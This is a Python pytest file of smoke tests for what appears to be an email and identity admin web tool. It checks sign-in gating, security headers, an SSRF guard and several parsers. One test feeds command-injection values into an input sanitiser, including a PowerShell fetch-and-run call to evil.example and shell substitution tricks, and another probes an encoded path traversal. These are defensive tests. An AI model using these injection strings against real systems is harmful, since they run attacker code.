"""Offline smoke tests: the app loads, pages are gated, parsers work on fictional samples."""
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from app import main
from app.core import auth

SAMPLES = Path(main.STATIC) / "samples"


@pytest.fixture(scope="module")
def client():
    return TestClient(main.app, base_url="http://testserver")


def test_all_modules_load():
    assert main.MODULE_ERRORS == {}


def test_health_is_public_and_hides_internals(client):
    r = client.get("/api/health")
    assert r.status_code == 200
    assert r.json()["status"] == "ok"
    assert "module_errors" not in r.json()


def test_security_headers(client):
    r = client.get("/api/health")
    assert "script-src 'self'" in r.headers["content-security-policy"]
    assert r.headers["x-frame-options"] == "DENY"
    assert r.headers["cache-control"] == "no-store"


def test_ui_and_api_require_sign_in(client):
    r = client.get("/", follow_redirects=False)
    assert r.status_code == 303 and r.headers["location"] == "/login"
    assert client.get("/api/meta").status_code == 401
    assert client.get("/core.js").status_code == 401
    assert client.post("/api/headers/analyze", json={"raw": "x"}).status_code == 401


def test_cross_origin_post_refused(client):
    r = client.post("/api/auth/login", json={"username": "a", "password": "b"}, headers={"Origin": "https://evil.example"})
    assert r.status_code == 403


def test_login_requires_json(client):
    r = client.post("/api/auth/login", data={"username": "a", "password": "b"})
    assert r.status_code == 415


def test_body_size_cap(client):
    r = client.post("/api/headers/analyze", content=b"x" * 10, headers={"content-length": "6000000", "content-type": "application/json"})
    assert r.status_code == 413


def test_password_hashing_and_policy():
    h = auth.hash_password("correct horse battery staple")
    assert auth.verify_password("correct horse battery staple", h)
    assert not auth.verify_password("wrong", h)
    with pytest.raises(auth.AuthError):
        auth.check_password_policy("short", "bob")
    with pytest.raises(auth.AuthError):
        auth.check_password_policy("bob-is-my-name-123", "bob")


def test_totp_rfc6238_vector():
    # RFC 6238 SHA-1 test secret "12345678901234567890", T=59s -> step 1 -> 94287082 (8 digits) / 287082 (6 digits)
    import base64
    secret = base64.b32encode(b"12345678901234567890").decode()
    assert auth._totp_at(secret, 1) == "287082"


def test_first_run_needs_setup(client):
    r = client.get("/api/auth/status")
    assert r.status_code == 200
    assert r.json().get("setup_required") is True


def test_header_analyzer_detects_loop():
    from app.modules.headers import analyze_headers
    res = analyze_headers((SAMPLES / "loop-headers.txt").read_text(encoding="utf-8"))
    assert res["loop"]["verdict"] == "likely"
    assert "Mimecast → Microsoft 365" in res["loop"]["repeated_handoffs"]


def test_ndr_decoder():
    from app.modules.ndr import analyze_ndr
    res = analyze_ndr((SAMPLES / "ndr-loop.txt").read_text(encoding="utf-8"))
    assert res["is_loop"]
    assert res["codes"]


def test_spf_merge_keeps_strictest_all():
    from app.modules.spf import merge_records
    merged = merge_records(["v=spf1 include:spf.protection.outlook.com ~all", "v=spf1 include:_spf.google.com -all"])
    rec = merged["record"] if isinstance(merged, dict) else merged
    assert "include:spf.protection.outlook.com" in rec and "include:_spf.google.com" in rec
    assert rec.endswith("-all") and "+all" not in rec


def test_outbound_guard_refuses_metadata_and_loopback():
    from app.core.outbound import resolve_safe
    for host in ("127.0.0.1", "169.254.169.254", "::1"):
        with pytest.raises(ValueError):
            resolve_safe(host)


def test_throttle_keys_group_ipv6_by_64():
    assert auth._ip_key("2001:db8:1:2::5") == auth._ip_key("2001:db8:1:2:ffff::9")
    assert auth._ip_key("2001:db8:1:3::5") != auth._ip_key("2001:db8:1:2::5")
    assert auth._ip_key("::ffff:192.0.2.7") == "192.0.2.7"
    assert auth._ip_key("192.0.2.7") == "192.0.2.7"


def test_command_values_are_validated():
    from app.core import cmdsafe
    assert cmdsafe.email("x@contoso.com; iex(iwr http://evil.example)") == "user@contoso.com"
    assert cmdsafe.dns_name("x$(calc).contoso.com") == "www.contoso.com"
    assert cmdsafe.url('http://ca.example/x.crt"; Start-Process calc; "') is None
    assert cmdsafe.ps_quote("it's") == "'it''s'"


def test_encoded_dot_segments_refused(client):
    assert client.get("/api/auth/..%2f..%2fcore.js").status_code == 404


def test_aadsts_list_regex_is_linear():
    import time
    from app.modules.identity import analyze_signin
    t = time.monotonic()
    with pytest.raises(ValueError):
        analyze_signin("1" * 5000 + "x")
    assert time.monotonic() - t < 2
